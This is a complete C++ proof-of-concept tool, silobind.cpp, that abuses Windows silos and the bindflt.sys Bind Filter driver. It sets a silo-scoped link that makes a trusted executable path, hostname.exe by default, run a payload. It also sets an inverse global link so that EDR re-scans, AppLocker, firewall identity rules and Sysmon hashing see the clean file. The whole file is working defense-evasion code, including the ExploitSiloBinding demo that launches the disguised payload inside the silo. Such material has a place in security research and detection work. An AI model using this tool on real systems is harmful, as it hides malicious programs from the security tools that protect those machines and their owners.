/*
 * silobind.cpp - Silo-Binding proof of concept.
 *
 * Technique: "Bind Link Abuse: One Windows Feature, Many Ways to Blind Your EDR"
 *            (Bitdefender Labs, 2026-07-15)  ->  the Silo-Binding variant.
 *
 * What it does
 * ------------
 * It creates a Windows *silo* (the isolation primitive behind Windows
 * containers / Windows Sandbox) and installs two Bind Filter (bindflt.sys)
 * mappings that describe opposite journeys for the same pair of files:
 *
 *   1. silo-scoped link :  <trusted path>  ->  <payload path>
 *                          active only inside the silo
 *   2. inverse global   :  <payload path>  ->  <trusted path>
 *      link                active everywhere else
 *
 * A process launched inside the silo as the trusted executable actually runs
 * the payload, while any tool that inspects the payload path from outside the
 * silo (EDR re-open/hash, AppLocker, firewall identity rules, Sysmon hashing)
 * is silently redirected to the clean, trusted file.
 *
 * The primitive is a documented Windows feature and requires local admin.
 * No vulnerable driver, no injection, no on-disk artifact (the mapping lives
 * in bindflt.sys memory and disappears on unload/reboot).
 *
 * For authorised research / lab use only. See README.md.
 */
#define NOMINMAX
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shellapi.h>
#include <stdint.h>
#include <stdio.h>
#include <stdarg.h>
#include <stddef.h>
#include <string>
#include <vector>
#include <cstring>
#include "bindflt.h"

#ifndef HRESULT_FROM_NT
#define HRESULT_FROM_NT(x) ((HRESULT)(x))
#endif

#ifndef JobObjectCreateSilo
#define JobObjectCreateSilo ((JOBOBJECTINFOCLASS)35)
#endif
#ifndef PROC_THREAD_ATTRIBUTE_JOB_LIST
#define PROC_THREAD_ATTRIBUTE_JOB_LIST ((DWORD_PTR)0x0002000D)
#endif
#ifndef EXTENDED_STARTUPINFO_PRESENT
#define EXTENDED_STARTUPINFO_PRESENT 0x00080000
#endif

/* ------------------------------------------------------------------ output */

static void Utf8Out(const std::wstring& s)
{
    if (s.empty()) return;
    int n = WideCharToMultiByte(CP_UTF8, 0, s.c_str(), (int)s.size(), NULL, 0, NULL, NULL);
    if (n <= 0) return;
    std::string u(n, 0);
    WideCharToMultiByte(CP_UTF8, 0, s.c_str(), (int)s.size(), &u[0], n, NULL, NULL);
    fwrite(u.data(), 1, u.size(), stdout);
    fflush(stdout);
}

static void P(const wchar_t* fmt, ...)
{
    wchar_t buf[4096];
    va_list ap; va_start(ap, fmt);
    int n = vswprintf(buf, 4095, fmt, ap);
    va_end(ap);
    if (n < 0) n = 0;
    buf[n] = 0;
    Utf8Out(buf);
}

/* ------------------------------------------------------------ bind filter */

static pfnBfSetupFilter   g_SetupFilter   = nullptr;
static pfnBfRemoveMapping g_RemoveMapping = nullptr;
static pfnBfGetMappings   g_GetMappings   = nullptr;
static pfnFilterConnectCommunicationPort g_FilterConnect = nullptr;
static pfnFilterSendMessage              g_FilterSend    = nullptr;
static bool g_useRaw = false;

static bool LoadDllInterface()
{
    HMODULE m = LoadLibraryW(L"bindfltapi.dll");
    if (!m) return false;
    g_SetupFilter   = (pfnBfSetupFilter)  GetProcAddress(m, "BfSetupFilter");
    g_RemoveMapping = (pfnBfRemoveMapping)GetProcAddress(m, "BfRemoveMapping");
    g_GetMappings   = (pfnBfGetMappings)  GetProcAddress(m, "BfGetMappings");
    return g_SetupFilter && g_RemoveMapping && g_GetMappings;
}

static bool LoadRawInterface()
{
    HMODULE m = LoadLibraryW(L"fltlib.dll");
    if (!m) return false;
    g_FilterConnect = (pfnFilterConnectCommunicationPort)GetProcAddress(m, "FilterConnectCommunicationPort");
    g_FilterSend    = (pfnFilterSendMessage)             GetProcAddress(m, "FilterSendMessage");
    return g_FilterConnect && g_FilterSend;
}

static bool InitApi(bool forceRaw)
{
    if (!forceRaw && LoadDllInterface()) { g_useRaw = false; return true; }
    if (LoadRawInterface())              { g_useRaw = true;  return true; }
    return false;
}

/* ---- raw \BindFltPort helpers (fallback, see bindflt.h) ---- */

static HRESULT WcpGetRootToken(const wchar_t* path, PBINDFLT_NORMALIZED_PATH* out)
{
    wchar_t drive[3] = { 0 };
    wchar_t dev[MAX_PATH] = { 0 };
    size_t plen = wcslen(path);
    if (plen < 3 || path[1] != L':') return E_INVALIDARG;
    memcpy(drive, path, 2 * sizeof(wchar_t));
    USHORT devLen = (USHORT)QueryDosDeviceW(drive, dev, MAX_PATH);
    if (!devLen) return HRESULT_FROM_WIN32(GetLastError());
    devLen -= 2; /* drop trailing NUL, mirroring bindfltapi!bfraw */
    USHORT fullLen = (USHORT)(plen - 2 + devLen);
    USHORT size = (USHORT)((fullLen * sizeof(wchar_t)) + sizeof(BINDFLT_NORMALIZED_PATH));
    PBINDFLT_NORMALIZED_PATH np = (PBINDFLT_NORMALIZED_PATH)malloc(size);
    if (!np) return E_OUTOFMEMORY;
    memset(np, 0, size);
    np->CbSize = size;
    np->VolumeNameSize = (USHORT)(devLen * sizeof(wchar_t));
    np->FullNameSize = (USHORT)(fullLen * sizeof(wchar_t));
    memcpy(&np->Name[0], dev, devLen * sizeof(wchar_t));
    memcpy(&np->Name[0] + devLen, path + 2, (fullLen - devLen) * sizeof(wchar_t));
    *out = np;
    return S_OK;
}

static HRESULT RawSetupFilter(HANDLE job, ULONG flags, LPCWSTR root, LPCWSTR target)
{
    HANDLE port = NULL;
    HRESULT hr = g_FilterConnect(L"\\BindFltPort", 0, NULL, 0, NULL, &port);
    if (hr != S_OK) return hr;

    PBINDFLT_NORMALIZED_PATH nRoot = nullptr, nTarget = nullptr;
    hr = WcpGetRootToken(root, &nRoot);
    if (hr != S_OK) { CloseHandle(port); return hr; }
    hr = WcpGetRootToken(target, &nTarget);
    if (hr != S_OK) { free(nRoot); CloseHandle(port); return hr; }

    ULONG msgSize = (ULONG)(sizeof(BINDFLT_MSG_HEADER) + sizeof(BINDFLT_STORE_MAPPING_MSG) +
                            nRoot->CbSize + nTarget->CbSize);
    PBINDFLT_MSG_HEADER hdr = (PBINDFLT_MSG_HEADER)malloc(msgSize);
    memset(hdr, 0, msgSize);
    hdr->Command = BFC_STORE_MAPPING;
    hdr->CbSize = msgSize;

    PBINDFLT_STORE_MAPPING_MSG body = (PBINDFLT_STORE_MAPPING_MSG)((PBYTE)hdr + sizeof(BINDFLT_MSG_HEADER));
    body->CbSize = msgSize - sizeof(BINDFLT_MSG_HEADER);
    body->ExceptionsArrayCount = 0;
    body->Flags = flags;
    body->JobHandle = (UINT64)(ULONG_PTR)job;
    body->Sid = 0;
    PBYTE base = (PBYTE)body;
    body->VirtualizationRootOffset = (UINT32)sizeof(BINDFLT_STORE_MAPPING_MSG);
    body->VirtualizationRootSize = nRoot->CbSize;
    memcpy(base + body->VirtualizationRootOffset, nRoot, nRoot->CbSize);
    body->VirtualizationTargetOffset = body->VirtualizationRootOffset + body->VirtualizationRootSize;
    body->VirtualizationTargetSize = nTarget->CbSize;
    memcpy(base + body->VirtualizationTargetOffset, nTarget, nTarget->CbSize);

    ULONG ret = 0;
    hr = g_FilterSend(port, hdr, msgSize, hdr, msgSize, &ret);
    if (hr == S_OK) {
        LONG st = *(LONG*)((PBYTE)hdr + sizeof(BINDFLT_MSG_HEADER));
        hr = (st >= 0) ? S_OK : HRESULT_FROM_NT(st);
    }
    free(nRoot); free(nTarget); free(hdr); CloseHandle(port);
    return hr;
}

static HRESULT RawRemoveMapping(HANDLE job, LPCWSTR root)
{
    HANDLE port = NULL;
    HRESULT hr = g_FilterConnect(L"\\BindFltPort", 0, NULL, 0, NULL, &port);
    if (hr != S_OK) return hr;
    PBINDFLT_NORMALIZED_PATH nRoot = nullptr;
    hr = WcpGetRootToken(root, &nRoot);
    if (hr != S_OK) { CloseHandle(port); return hr; }

    ULONG msgSize = (ULONG)(sizeof(BINDFLT_MSG_HEADER) + sizeof(BINDFLT_REMOVE_MAPPING_MSG) + nRoot->CbSize);
    PBINDFLT_MSG_HEADER hdr = (PBINDFLT_MSG_HEADER)malloc(msgSize);
    memset(hdr, 0, msgSize);
    hdr->Command = BFC_REMOVE_MAPPING;
    hdr->CbSize = msgSize;
    PBINDFLT_REMOVE_MAPPING_MSG body = (PBINDFLT_REMOVE_MAPPING_MSG)((PBYTE)hdr + sizeof(BINDFLT_MSG_HEADER));
    body->JobHandle = (UINT64)(ULONG_PTR)job;
    body->Sid = 0;
    PBYTE base = (PBYTE)body;
    body->VirtualizationRootOffset = (UINT16)offsetof(BINDFLT_REMOVE_MAPPING_MSG, Data);
    body->VirtualizationRootSize = nRoot->CbSize;
    memcpy(base + body->VirtualizationRootOffset, nRoot, nRoot->CbSize);

    ULONG ret = 0;
    hr = g_FilterSend(port, hdr, msgSize, hdr, msgSize, &ret);
    if (hr == S_OK) {
        LONG st = *(LONG*)((PBYTE)hdr + sizeof(BINDFLT_MSG_HEADER));
        hr = (st >= 0) ? S_OK : HRESULT_FROM_NT(st);
    }
    free(nRoot); free(hdr); CloseHandle(port);
    return hr;
}

/* ---- unified API ---- */

static HRESULT BfLink(HANDLE job, ULONG flags, LPCWSTR root, LPCWSTR target)
{
    if (g_useRaw) return RawSetupFilter(job, flags, root, target);
    return g_SetupFilter(job, flags, root, target, NULL, 0);
}
static HRESULT BfUnlink(HANDLE job, LPCWSTR root)
{
    if (g_useRaw) return RawRemoveMapping(job, root);
    return g_RemoveMapping(job, root);
}

/* ------------------------------------------------------------------- silo */

static HANDLE OpenOrCreateSilo(const std::wstring& name, DWORD* err)
{
    HANDLE h = OpenJobObjectW(JOB_OBJECT_ALL_ACCESS, FALSE, name.c_str());
    if (!h) h = OpenJobObjectW(JOB_OBJECT_QUERY, FALSE, name.c_str());
    if (h) return h;

    h = CreateJobObjectW(NULL, name.c_str());
    if (!h) { if (err) *err = GetLastError(); return NULL; }

    JOBOBJECT_EXTENDED_LIMIT_INFORMATION jeli;
    memset(&jeli, 0, sizeof(jeli));
    jeli.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
    SetInformationJobObject(h, JobObjectExtendedLimitInformation, &jeli, sizeof(jeli));

    if (!SetInformationJobObject(h, JobObjectCreateSilo, NULL, 0)) {
        if (err) *err = GetLastError();
        CloseHandle(h);
        return NULL;
    }
    return h;
}

/* -------------------------------------------------------------- processes */

static bool RunCapture(const std::wstring& cmdline, HANDLE job, std::string& out, DWORD* exitCode)
{
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(sa); sa.lpSecurityDescriptor = NULL; sa.bInheritHandle = TRUE;
    HANDLE rd = NULL, wr = NULL;
    if (!CreatePipe(&rd, &wr, &sa, 0)) return false;
    SetHandleInformation(rd, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOEXW si;
    memset(&si, 0, sizeof(si));
    si.StartupInfo.cb = sizeof(si);
    si.StartupInfo.dwFlags = STARTF_USESTDHANDLES;
    si.StartupInfo.hStdOutput = wr;
    si.StartupInfo.hStdError = wr;
    si.StartupInfo.hStdInput = GetStdHandle(STD_INPUT_HANDLE);

    DWORD flags = 0;
    std::vector<char> attrBuf;
    LPPROC_THREAD_ATTRIBUTE_LIST pal = NULL;
    if (job) {
        SIZE_T sz = 0;
        InitializeProcThreadAttributeList(NULL, 1, 0, &sz);
        attrBuf.resize(sz);
        pal = (LPPROC_THREAD_ATTRIBUTE_LIST)attrBuf.data();
        if (!InitializeProcThreadAttributeList(pal, 1, 0, &sz)) { CloseHandle(rd); CloseHandle(wr); return false; }
        if (!UpdateProcThreadAttribute(pal, 0, PROC_THREAD_ATTRIBUTE_JOB_LIST, &job, sizeof(job), NULL, NULL)) {
            DeleteProcThreadAttributeList(pal); CloseHandle(rd); CloseHandle(wr); return false;
        }
        si.lpAttributeList = pal;
        flags = EXTENDED_STARTUPINFO_PRESENT;
    }

    std::vector<wchar_t> buf(cmdline.begin(), cmdline.end());
    buf.push_back(0);
    PROCESS_INFORMATION pi;
    memset(&pi, 0, sizeof(pi));
    BOOL ok = CreateProcessW(NULL, buf.data(), NULL, NULL, TRUE, flags, NULL, NULL, &si.StartupInfo, &pi);
    CloseHandle(wr);
    if (!ok) {
        if (pal) DeleteProcThreadAttributeList(pal);
        CloseHandle(rd);
        return false;
    }
    char tmp[4096];
    DWORD n = 0;
    while (ReadFile(rd, tmp, sizeof(tmp), &n, NULL) && n > 0) out.append(tmp, n);
    WaitForSingleObject(pi.hProcess, INFINITE);
    if (exitCode) GetExitCodeProcess(pi.hProcess, exitCode);
    CloseHandle(pi.hThread); CloseHandle(pi.hProcess); CloseHandle(rd);
    if (pal) DeleteProcThreadAttributeList(pal);
    return true;
}

/* --------------------------------------------------------------- identity */

static bool HashFile(const std::wstring& path, uint64_t* size, uint64_t* hash, std::wstring* finalPath)
{
    HANDLE h = CreateFileW(path.c_str(), GENERIC_READ,
                           FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                           NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return false;
    LARGE_INTEGER li; li.QuadPart = 0;
    GetFileSizeEx(h, &li);
    if (size) *size = (uint64_t)li.QuadPart;

    uint64_t hh = 1469598103934665603ULL; /* FNV-1a 64 */
    char buf[65536]; DWORD n = 0;
    while (ReadFile(h, buf, sizeof(buf), &n, NULL) && n > 0)
        for (DWORD i = 0; i < n; i++) { hh ^= (unsigned char)buf[i]; hh *= 1099511628211ULL; }
    if (hash) *hash = hh;

    if (finalPath) {
        wchar_t fp[1024]; fp[0] = 0;
        DWORD l = GetFinalPathNameByHandleW(h, fp, 1023, FILE_NAME_NORMALIZED | VOLUME_NAME_DOS);
        if (l > 0 && l < 1024) *finalPath = fp;
    }
    CloseHandle(h);
    return true;
}

/* ------------------------------------------------------------------ usage */

static void Usage()
{
    P(L"silobind - Silo-Binding PoC (bindflt.sys + Windows silo)\n");
    P(L"\n");
    P(L"  silobind demo [trusted] [payload] [silo]   run the full Silo-Binding demo\n");
    P(L"  silobind link   <virtRoot> <backing> [silo] create a link (silo-scoped if silo given)\n");
    P(L"  silobind unlink <virtRoot> [silo]           remove a link\n");
    P(L"  silobind dump   [silo]                      list active mappings (global or silo)\n");
    P(L"  silobind run    <cmdline...>                run a command outside the silo\n");
    P(L"  silobind runj   <silo> <cmdline...>         run a command inside the silo\n");
    P(L"  silobind read   <path>                      print size/hash/final-path of a file\n");
    P(L"  silobind --raw  ...                         force the raw \\\\BindFltPort interface\n");
}

/* -------------------------------------------------------------- commands */

static int CmdLink(const std::wstring& root, const std::wstring& backing, const std::wstring& silo)
{
    HANDLE job = NULL;
    if (!silo.empty()) {
        DWORD err = 0;
        job = OpenOrCreateSilo(silo, &err);
        if (!job) { P(L"[!] silo create/open failed (win32=%lu)\n", err); return 1; }
    }
    ULONG flags = job ? BINDFLT_FLAG_USE_CURRENT_SILO_MAPPING : BINDFLT_FLAG_NONE;
    HRESULT hr = BfLink(job, flags, root.c_str(), backing.c_str());
    P(L"[%s] link  %s  ->  %s  (%s)\n", hr == S_OK ? L"+" : L"-",
      root.c_str(), backing.c_str(), job ? L"silo-scoped" : L"global");
    if (hr != S_OK) P(L"    HRESULT = 0x%08lX\n", (unsigned long)hr);
    if (job) CloseHandle(job);
    return hr == S_OK ? 0 : 1;
}

static int CmdUnlink(const std::wstring& root, const std::wstring& silo)
{
    HANDLE job = NULL;
    if (!silo.empty()) {
        DWORD err = 0;
        job = OpenOrCreateSilo(silo, &err);
        if (!job) { P(L"[!] silo open failed (win32=%lu)\n", err); return 1; }
    }
    HRESULT hr = BfUnlink(job, root.c_str());
    P(L"[%s] unlink %s (%s)\n", hr == S_OK ? L"+" : L"-", root.c_str(),
      job ? L"silo-scoped" : L"global");
    if (job) CloseHandle(job);
    return hr == S_OK ? 0 : 1;
}

static void DumpMappings(HANDLE job)
{
    if (g_useRaw) { P(L"[i] dump is not implemented for the raw interface\n"); return; }
    ULONG size = 5 * 4096;
    std::vector<BYTE> buff(size, 0);
    ULONG flags = job ? BINDFLT_GET_MAPPINGS_FLAG_SILO : BINDFLT_GET_MAPPINGS_FLAG_VOLUME;
    HRESULT hr = g_GetMappings(flags, job, job ? NULL : L"C:\\", NULL, &size, buff.data());
    if (hr != S_OK) { P(L"[!] BfGetMappings failed 0x%08lX\n", (unsigned long)hr); return; }

    PBINDFLT_GET_MAPPINGS_INFO info = (PBINDFLT_GET_MAPPINGS_INFO)buff.data();
    ULONG avail = (size <= buff.size()) ? size : (ULONG)buff.size();
    ULONG count = info->MappingCount;

    /* Two reply layouts exist in the wild:
     *   compact (Windows 10):  { UINT16 virtLen; UINT16 tgtLen; UINT32 virtOff; UINT32 tgtOff; }  (12 bytes)
     *   rs5+    (Windows 11):  { UINT32 virtLen; UINT32 virtOff; UINT32 flags; UINT32 nTargets; UINT32 tgtOff; } (20 bytes)
     * Detect by validating the first entry. */
    bool compact = false;
    if (count && avail >= 24) {
        UINT16 l1 = *(UINT16*)(buff.data() + 12);
        UINT16 l2 = *(UINT16*)(buff.data() + 14);
        UINT32 o1 = *(UINT32*)(buff.data() + 16);
        UINT32 o2 = *(UINT32*)(buff.data() + 20);
        if (l1 > 1 && l2 > 1 && !(l1 & 1) && !(l2 & 1) &&
            (ULONG)o1 + l1 <= avail && (ULONG)o2 + l2 <= avail)
            compact = true;
    }

    P(L"[*] %s mappings: %u\n", job ? L"silo" : L"global", count);
    for (ULONG i = 0; i < count; i++) {
        if (compact) {
            size_t e = 12 + (size_t)i * 12;
            if (e + 12 > avail) break;
            UINT16 l1 = *(UINT16*)(buff.data() + e);
            UINT16 l2 = *(UINT16*)(buff.data() + e + 2);
            UINT32 o1 = *(UINT32*)(buff.data() + e + 4);
            UINT32 o2 = *(UINT32*)(buff.data() + e + 8);
            if ((ULONG)o1 + l1 > avail || (ULONG)o2 + l2 > avail) continue;
            std::wstring virt((wchar_t*)(buff.data() + o1), l1 / 2);
            std::wstring tgt((wchar_t*)(buff.data() + o2), l2 / 2);
            P(L"      [%u] %s\n           -> %s\n", i, virt.c_str(), tgt.c_str());
        } else {
            size_t e = 12 + (size_t)i * 20;
            if (e + 20 > avail) break;
            UINT32 vl = *(UINT32*)(buff.data() + e);
            UINT32 vo = *(UINT32*)(buff.data() + e + 4);
            UINT32 ntg = *(UINT32*)(buff.data() + e + 12);
            UINT32 to = *(UINT32*)(buff.data() + e + 16);
            if ((ULONG)vo + vl > avail) continue;
            std::wstring virt((wchar_t*)(buff.data() + vo), vl / 2);
            P(L"      [%u] %s\n", i, virt.c_str());
            for (UINT32 j = 0; j < ntg; j++) {
                size_t te = to + (size_t)j * 8;
                if (te + 8 > avail) break;
                UINT32 tl = *(UINT32*)(buff.data() + te);
                UINT32 tto = *(UINT32*)(buff.data() + te + 4);
                if ((ULONG)tto + tl > avail) continue;
                std::wstring tgt((wchar_t*)(buff.data() + tto), tl / 2);
                P(L"           -> %s\n", tgt.c_str());
            }
        }
    }
}

static std::wstring SelfPath()
{
    wchar_t p[1024]; DWORD n = GetModuleFileNameW(NULL, p, 1023);
    return std::wstring(p, n);
}

static std::wstring SelfDir()
{
    std::wstring p = SelfPath();
    size_t s = p.find_last_of(L"\\/");
    return s == std::wstring::npos ? L"." : p.substr(0, s);
}

static int CmdRead(const std::wstring& path)
{
    uint64_t sz = 0, hash = 0; std::wstring fp;
    if (!HashFile(path, &sz, &hash, &fp)) {
        P(L"[!] cannot open %s (win32=%lu)\n", path.c_str(), GetLastError());
        return 1;
    }
    P(L"HASH|%llu|%016llx|%s|%s\n", (unsigned long long)sz, (unsigned long long)hash,
      fp.c_str(), path.c_str());
    return 0;
}

/* -------------------------------------------------------------------- demo */

/* ============================================================================
 *  ExploitSiloBinding()   <-- MAIN FUNCTION: the Windows silo is exploited here.
 *
 *  Every numbered block below is one discrete "silo action". The program prints
 *  the same numbered steps, so the log reads exactly like this source.
 * ==========================================================================*/
static int ExploitSiloBinding(std::wstring trusted, std::wstring payload, std::wstring silo)
{
    if (trusted.empty()) trusted = L"C:\\Windows\\System32\\hostname.exe";
    if (payload.empty()) payload = SelfDir() + L"\\payload.exe";
    if (silo.empty())    silo = L"silo-ghost";

    std::wstring marker = SelfDir() + L"\\pwned.txt";

    P(L"\n=====================================================================\n");
    P(L" Silo-Binding PoC - exploiting the Windows silo + bindflt.sys\n");
    P(L"   trusted (allowlisted) : %s\n", trusted.c_str());
    P(L"   payload (forbidden)   : %s\n", payload.c_str());
    P(L"   silo                  : %s\n", silo.c_str());
    P(L"   bind filter interface : %s\n", g_useRaw ? L"raw \\BindFltPort" : L"bindfltapi.dll");
    P(L"=====================================================================\n");

    if (GetFileAttributesW(payload.c_str()) == INVALID_FILE_ATTRIBUTES) {
        P(L"[!] payload not found: %s\n", payload.c_str());
        return 1;
    }

    /* silently drop a leftover inverse link from a previous run (global links
       survive process exit) so the baseline and step [4] below are clean */
    BfUnlink(NULL, payload.c_str());

    /* ---- [1] baseline: identity of both files before any bind link --------- */
    P(L"\n// [1] baseline: read both files BEFORE any bind link exists.\n");
    uint64_t tSize = 0, tHash = 0, pSize = 0, pHash = 0;
    std::wstring dummy;
    if (!HashFile(trusted, &tSize, &tHash, &dummy) ||
        !HashFile(payload, &pSize, &pHash, &dummy)) {
        P(L"[!] baseline hashing failed\n");
        return 1;
    }
    P(L"    trusted %s : %llu bytes  hash=%016llx\n", trusted.c_str(),
      (unsigned long long)tSize, (unsigned long long)tHash);
    P(L"    payload %s : %llu bytes  hash=%016llx\n", payload.c_str(),
      (unsigned long long)pSize, (unsigned long long)pHash);

    /* ---- [2] SILO ACTION: create the silo ---------------------------------- */
    P(L"\n// [2] SILO ACTION: create a named job object and promote it to a server silo.\n");
    P(L"//     kernel call -> SetInformationJobObject(hJob, JobObjectCreateSilo, NULL, 0)\n");
    DWORD err = 0;
    HANDLE job = OpenOrCreateSilo(silo, &err);
    if (!job) {
        P(L"[!] silo creation failed (win32=%lu). Needs admin/SeTcbPrivilege.\n", err);
        return 1;
    }
    P(L"[+] silo \"%s\" created and promoted (handle held for the life of this process)\n", silo.c_str());

    /* ---- [3] SILO ACTION: silo-scoped link  trusted -> payload ------------- */
    P(L"\n// [3] SILO ACTION: silo-scoped bind link  trusted -> payload.\n");
    P(L"//     kernel call -> BfSetupFilter(hSilo, BINDFLT_FLAG_USE_CURRENT_SILO_MAPPING,\n");
    P(L"//                                  L\"%s\", L\"%s\")\n", trusted.c_str(), payload.c_str());
    P(L"//     -> visible ONLY to processes running inside the silo.\n");
    HRESULT hr1 = BfLink(job, BINDFLT_FLAG_USE_CURRENT_SILO_MAPPING, trusted.c_str(), payload.c_str());
    P(L"[%s] silo link   : %s -> %s\n", hr1 == S_OK ? L"+" : L"-", trusted.c_str(), payload.c_str());
    if (hr1 != S_OK) P(L"      HRESULT = 0x%08lX\n", (unsigned long)hr1);

    /* ---- [4] SILO ACTION: inverse global link  payload -> trusted ---------- */
    P(L"\n// [4] SILO ACTION: inverse GLOBAL bind link  payload -> trusted.\n");
    P(L"//     kernel call -> BfSetupFilter(NULL, BINDFLT_FLAG_NONE,\n");
    P(L"//                                  L\"%s\", L\"%s\")\n", payload.c_str(), trusted.c_str());
    P(L"//     -> visible to EVERYONE outside the silo (the clean decoy).\n");
    HRESULT hr2 = BfLink(NULL, BINDFLT_FLAG_NONE, payload.c_str(), trusted.c_str());
    P(L"[%s] global link : %s -> %s\n", hr2 == S_OK ? L"+" : L"-", payload.c_str(), trusted.c_str());
    if (hr2 != S_OK) P(L"      HRESULT = 0x%08lX\n", (unsigned long)hr2);
    if (hr1 != S_OK || hr2 != S_OK) { CloseHandle(job); return 1; }

    /* ---- [5] SILO ACTION: verify the two filesystem views ------------------ */
    P(L"\n// [5] SILO ACTION: verify the split view (same path, two answers).\n");
    P(L"//     (a) OUTSIDE the silo: open the payload path -> bindflt returns the trusted file.\n");
    uint64_t sz = 0, h = 0; std::wstring fp;
    if (HashFile(payload, &sz, &h, &fp)) {
        P(L"[outside] %s\n", payload.c_str());
        P(L"          size=%llu hash=%016llx  final=%s\n", (unsigned long long)sz, (unsigned long long)h, fp.c_str());
        P(L"          => %s\n", h == tHash ? L"redirected to the TRUSTED file (what an EDR re-scan would hash)"
                                           : L"NOT redirected");
    }
    P(L"//     (b) INSIDE the silo: open the trusted path -> bindflt returns the payload.\n");
    std::string out; DWORD code = 0;
    std::wstring cmd = L"\"" + SelfPath() + L"\" read \"" + trusted + L"\"";
    if (RunCapture(cmd, job, out, &code) && !out.empty()) {
        P(L"[inside]  %S", out.c_str());
        P(L"          => inside the silo the trusted path resolves to the PAYLOAD\n");
    } else {
        P(L"  [!] in-silo read failed (win32=%lu)\n", GetLastError());
    }

    /* ---- [6] SILO ACTION: execute the trusted name inside the silo --------- */
    P(L"\n// [6] SILO ACTION: launch \"%s\" inside the silo.\n", trusted.c_str());
    P(L"//     CreateProcessW(..., PROC_THREAD_ATTRIBUTE_JOB_LIST = hSilo) puts the child in the silo,\n");
    P(L"//     but the image is resolved in the PARENT's context -> two-stage launch:\n");
    P(L"//       stage 1: a launcher enters the silo;  stage 2: it spawns the trusted name (now in-silo).\n");
    DeleteFileW(marker.c_str());
    std::wstring run = L"\"" + SelfPath() + L"\" run \"" + trusted + L"\" \"" + marker + L"\"";
    out.clear();
    if (RunCapture(run, job, out, &code)) P(L"%S", out.c_str());
    else P(L"  [!] launch failed (win32=%lu)\n", GetLastError());
    P(L"    marker file created: %s\n",
      GetFileAttributesW(marker.c_str()) != INVALID_FILE_ATTRIBUTES ? L"YES" : L"no");

    /* ---- [7] SILO ACTION: enumerate active mappings (defender view) -------- */
    P(L"\n// [7] SILO ACTION: enumerate active bind mappings (global + silo-scoped).\n");
    DumpMappings(NULL);
    DumpMappings(job);

    /* ---- [8] cleanup ------------------------------------------------------- */
    P(L"\n// [8] cleanup: remove both links and close the silo.\n");
    BfUnlink(job, trusted.c_str());
    BfUnlink(NULL, payload.c_str());
    CloseHandle(job); /* JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE tears the silo down */
    P(L"[*] links removed, silo closed.\n");
    return 0;
}

/* -------------------------------------------------------------------- main */

int main(int argc, char** argv)
{
    int wargc = 0;
    LPWSTR* wargv = CommandLineToArgvW(GetCommandLineW(), &wargc);
    if (!wargv) return 1;
    std::vector<std::wstring> a;
    for (int i = 0; i < wargc; i++) a.push_back(wargv[i]);

    bool raw = false;
    std::vector<std::wstring> rest;
    for (size_t i = 1; i < a.size(); i++) {
        if (a[i] == L"--raw") { raw = true; continue; }
        if (a[i] == L"--help" || a[i] == L"-h") { Usage(); return 0; }
        rest.push_back(a[i]);
    }
    if (rest.empty()) { Usage(); return 0; }

    if (!InitApi(raw)) { P(L"[!] no bind filter interface available\n"); return 1; }

    const std::wstring& cmd = rest[0];
    int rc = 0;
    if (cmd == L"demo") {
        rc = ExploitSiloBinding(rest.size() > 1 ? rest[1] : L"",
                     rest.size() > 2 ? rest[2] : L"",
                     rest.size() > 3 ? rest[3] : L"");
    } else if (cmd == L"link") {
        if (rest.size() < 3) { Usage(); rc = 1; }
        else rc = CmdLink(rest[1], rest[2], rest.size() > 3 ? rest[3] : L"");
    } else if (cmd == L"unlink") {
        if (rest.size() < 2) { Usage(); rc = 1; }
        else rc = CmdUnlink(rest[1], rest.size() > 2 ? rest[2] : L"");
    } else if (cmd == L"dump") {
        HANDLE job = NULL;
        if (rest.size() > 1) { DWORD e = 0; job = OpenOrCreateSilo(rest[1], &e); }
        DumpMappings(job);
        if (job) CloseHandle(job);
    } else if (cmd == L"read") {
        if (rest.size() < 2) { Usage(); rc = 1; } else rc = CmdRead(rest[1]);
    } else if (cmd == L"run" || cmd == L"runj") {
        HANDLE job = NULL;
        size_t first = 1;
        if (cmd == L"runj") {
            if (rest.size() < 3) { Usage(); LocalFree(wargv); return 1; }
            DWORD e = 0; job = OpenOrCreateSilo(rest[1], &e);
            if (!job) { P(L"[!] silo open failed (win32=%lu)\n", e); LocalFree(wargv); return 1; }
            first = 2;
        }
        std::wstring line;
        for (size_t i = first; i < rest.size(); i++) { line += rest[i]; line += L" "; }
        if (!line.empty()) line.pop_back();
        std::string out; DWORD code = 0;
        if (RunCapture(line, job, out, &code)) { P(L"%S", out.c_str()); P(L"\n[exit=%lu]\n", code); }
        else P(L"[!] CreateProcess failed (win32=%lu)\n", GetLastError());
        if (job) CloseHandle(job);
    } else {
        P(L"[!] unknown command: %s\n", cmd.c_str());
        Usage(); rc = 1;
    }

    LocalFree(wargv);
    return rc;
}
